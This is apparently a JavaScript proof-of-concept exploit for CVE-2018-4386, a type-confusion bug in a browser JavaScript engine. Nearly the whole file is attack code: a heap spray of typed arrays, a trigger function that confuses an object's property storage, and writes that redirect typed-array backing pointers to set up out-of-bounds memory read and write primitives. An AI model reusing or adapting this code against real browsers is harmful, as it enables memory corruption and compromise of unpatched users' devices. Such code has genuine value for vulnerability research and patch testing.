const STRUCT_SPRAY_SIZE = 0x10000;

var leaker_obj = { a: 0 };
var leaker_arr = new Uint32Array(6);
var oob_slave = new Uint8Array(1024);
var oob_master = new Uint32Array(7);
var spray = [];

for (let i = 0; i < STRUCT_SPRAY_SIZE; i++) {
  let sprayed = new Uint32Array(1);
  sprayed[i + "spray"] = 123;
  spray.push(sprayed); // keep this alive (no gc)
}

var target = {
  a: 2.1100820415101592e-303,
  b: false,
  c: true,
  d: 5678
};

var impl_idx = 0; // global impl object index
function create_impl() {
  let implobj = { a: target };

  for (let i = 0; i < 32; i++, impl_idx++) 
    implobj[impl_idx + "x"] = {};

  return implobj;
}
// Exploit Implementation of CVE-2018-4386.
function trigger(x) {
  if (impl.a != target)return;

  var o = { a: 1 }; //a is type-confused with m_impl
  for (var i in o) {
    {
      i = x;
      function i() {}
    }
    o[i]; //this sets bit 4 (|= 16) in m_hashAndFlags
  }
  if (impl.a != target) {
    target.c = leaker_obj;
    leaker_obj.a = leaker_obj;
    var l1 = impl.a[4];
    var l2 = impl.a[5];
    leaker_obj.a = oob_slave;
    var s1 = impl.a[4];
    var s2 = impl.a[5];
    target.c = leaker_arr;
    impl.a[4] = l1;
    impl.a[5] = l2;
    target.c = oob_master;
    impl.a[4] = s1;
    impl.a[5] = s2;
    impl.a = target;
    throw "Bug successfully Triggered";
  }
}
try {
  for (var _ = 0; _ < 1024; _++) {
    var impl = create_impl();
    var s = { a: impl };
    trigger(s);
  }
} catch (e) {
  printf(e);
}
